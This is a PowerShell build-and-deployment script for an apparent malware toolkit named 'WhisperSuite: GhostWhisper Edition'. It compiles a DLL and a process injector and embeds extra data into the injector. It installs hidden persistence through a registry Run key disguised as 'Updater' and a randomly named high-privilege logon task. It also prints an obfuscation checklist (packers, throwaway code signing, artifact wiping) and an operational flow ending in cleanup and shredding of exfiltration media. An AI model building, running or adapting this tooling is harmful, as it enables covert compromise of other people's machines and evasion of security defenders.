# BuildDeployWhisper.ps1
# Master build + deployment script for WhisperSuite: GhostWhisper Edition
# Includes compilation, polymorphism, persistence, BLE trigger, wormhole, and virtualization

$baseDir = $PSScriptRoot
$finalPackage = Join-Path $baseDir "WhisperSuite_Build"
$dropperSource = Join-Path $baseDir "Dropper_with_Raven.cpp"

# === Core Binaries ===
$ghostKeyDLL = Join-Path $baseDir "GhostKey\bin\Release\GhostKey.dll"
$injectorEXE = Join-Path $baseDir "WraithTap\x64\Release\WraithTap.exe"
$dropperEXE = Join-Path $baseDir "Dropper_with_Raven.exe"
$cleanerPS1 = Join-Path $baseDir "SilentBloom.ps1"
$bleTriggerScript = Join-Path $baseDir "BLETrigger.ps1"
$polymorphScript = Join-Path $baseDir "GhostPolymorph.ps1"
$bleConnectScript = Join-Path $baseDir "GhostBLEConnect_v2.ps1"
$bootstrapScript = Join-Path $baseDir "GhostWhisperBootstrap.ps1"

# === Modules ===
$modulePaths = @(
    "Modules\GhostLogger.ps1",
    "Modules\AnomalyHunter.ps1",
    "Modules\Anomaly_Detector.ps1",
    "Modules\Wormhole.ps1",
    "Modules\LinuxPDF_Emu.ps1",
    "Modules\LinuxPDF_Runtime.ps1",
    "Modules\Phase_Anoint.ps1",
    "Modules\Phase_Bind.ps1",
    "Modules\Phase_Cleanse.ps1",
    "Modules\GhostResidency.ps1",
    "Modules\GhostSeal.ps1",
    "Modules\ExorcistMode.ps1"
)

function Compile-Projects {
    Write-Host "[*] Compiling C# GhostKey DLL..."
    msbuild "$baseDir\GhostKey\GhostKey.csproj" /p:Configuration=Release | Out-Null

    Write-Host "[*] Compiling C++ WraithTap Injector..."
    msbuild "$baseDir\WraithTap\WraithTap.vcxproj" /p:Configuration=Release /p:Platform=x64 | Out-Null
}

function Compile-Dropper {
    Write-Host "[*] Compiling Dropper_with_Raven.cpp (poem embed tool)..."

    if (Test-Path $dropperSource) {
        & cl.exe /EHsc /O2 "/Fe:$dropperEXE" $dropperSource
        if ($LASTEXITCODE -eq 0) {
            Write-Host "[+] Dropper compiled: $dropperEXE"
        }
        else {
            Write-Warning "[-] Dropper compile failed with exit code $LASTEXITCODE"
        }
    }
    else {
        Write-Warning "[-] $dropperSource not found; skipping poem embed step."
    }
}

function Embed-RavenPoem {
    Write-Host "[*] Embedding Raven's poem into injector..."
    if (Test-Path $dropperEXE -and (Test-Path $injectorEXE)) {
        & $dropperEXE $injectorEXE
        if ($LASTEXITCODE -eq 0) {
            Write-Host "[+] Poem appended successfully."
        }
        else {
            Write-Warning "[-] Poem embed failed. Exit code: $LASTEXITCODE"
        }
    }
    else {
        Write-Warning "[-] Dropper or WraithTap exe missing; cannot embed poem."
    }
}

function Prepare-Package {
    Write-Host "[*] Packaging WhisperSuite build..."
    New-Item -ItemType Directory -Path $finalPackage -Force | Out-Null
    New-Item -ItemType Directory -Path "$finalPackage\Modules" -Force | Out-Null

    # Copy final EXE (poem embedded) + other artifacts
    Copy-Item $injectorEXE        (Join-Path $finalPackage "WraithTap.exe") -Force
    Copy-Item $ghostKeyDLL        (Join-Path $finalPackage "GhostKey.dll")  -Force
    Copy-Item $cleanerPS1         (Join-Path $finalPackage "SilentBloom.ps1") -Force
    Copy-Item $bleTriggerScript   (Join-Path $finalPackage "BLETrigger.ps1")  -Force
    Copy-Item $polymorphScript    (Join-Path $finalPackage "GhostPolymorph.ps1") -Force
    Copy-Item $bleConnectScript   (Join-Path $finalPackage "GhostBLEConnect_v2.ps1") -Force
    Copy-Item $bootstrapScript    (Join-Path $finalPackage "GhostWhisperBootstrap.ps1") -Force

    # Modules
    foreach ($mod in $modulePaths) {
        $fullPath = Join-Path $baseDir $mod
        if (Test-Path $fullPath) {
            $destPath = Join-Path $finalPackage $mod
            # Ensure directory structure
            New-Item -ItemType Directory -Path (Split-Path $destPath) -Force | Out-Null
            Copy-Item $fullPath $destPath -Force
        }
        else {
            Write-Warning "[!] Missing module: $mod"
        }
    }

    # Tribute note
    $note = @"
This toolkit is a ghost in motion.
It exists for those who are unseen.
And for one who is gone, but not forgotten.

—R
"@
    Set-Content -Path (Join-Path $finalPackage "note.txt") -Value $note

    Write-Host "[✓] WhisperSuite is ready: $finalPackage"
}

function Setup-Persistence {
    Write-Host "[*] Creating registry and scheduled task persistence..."

    $payloadPath = "C:\\Windows\\System32\\GhostKey.dll"
    $injectorPath = "C:\\Windows\\System32\\WraithTap.exe"
    $execCommand = "$injectorPath $payloadPath"

    try {
        Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" `
            -Name "Updater" -Value $execCommand -Force
        Write-Host "[+] Registry persistence set (HKCU Run key)."
    }
    catch {
        Write-Warning "[-] Failed to create registry key: $_"
    }

    try {
        $taskName = "WinSvc_" + -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
        schtasks /create /tn $taskName /tr "\"$injectorPath\" \"$payloadPath\"" `
            /sc onlogon /rl highest /f | Out-Null
        Write-Host "[+] Scheduled task created ($taskName)."
    }
    catch {
        Write-Warning "[-] Failed to create scheduled task: $_"
    }
}

function Deploy-BLETrigger {
    Write-Host "[*] Creating BLE trigger script with encrypted handshake and EDR evasion..."
    $templatePath = Join-Path $baseDir "Templates\BLETrigger_Encrypted.ps1"
    if (Test-Path $templatePath) {
        $bleScript = Get-Content $templatePath -Raw
        Set-Content -Path $bleTriggerScript -Value $bleScript
        Write-Host "[+] BLE trigger deployed."
    }
    else {
        Write-Warning "[-] BLETrigger_Encrypted.ps1 not found in Templates."
    }
}

function Show-Obfuscation-Checklist {
    Write-Host "`n===== OBFUSCATION CHECKLIST ====="
    Write-Host "[1] Run GhostKey.dll through ConfuserEx or Dotfuscator"
    Write-Host "[2] Strip symbols from WraithTap.exe (/DEBUG:NONE)"
    Write-Host "[3] Use UPX or similar packer for WraithTap"
    Write-Host "[4] Randomize filenames or strings for each deployment"
    Write-Host "[5] Wipe build artifacts with cipher /w or sdelete"
    Write-Host "[6] Optionally sign with throwaway certificate"
}

function Show-Deployment-Flow {
    Write-Host "`n===== DEPLOYMENT FLOW ====="
    Write-Host "[1] Transfer WhisperSuite_Build to secure device (USB, Flipper, etc)"
    Write-Host "[2] Use GhostWhisperBootstrap.ps1 to engage modules"
    Write-Host "[3] Trigger via BLETrigger.ps1 or WraithTap.exe GhostKey.dll"
    Write-Host "[4] Run SilentBloom.ps1 post-op for cleanup"
    Write-Host "[5] Securely shred or format exfiltration media"
}

# === EXECUTION ===
Compile-Projects
Compile-Dropper
Embed-RavenPoem
Prepare-Package
Setup-Persistence
Deploy-BLETrigger
Show-Obfuscation-Checklist
Show-Deployment-Flow
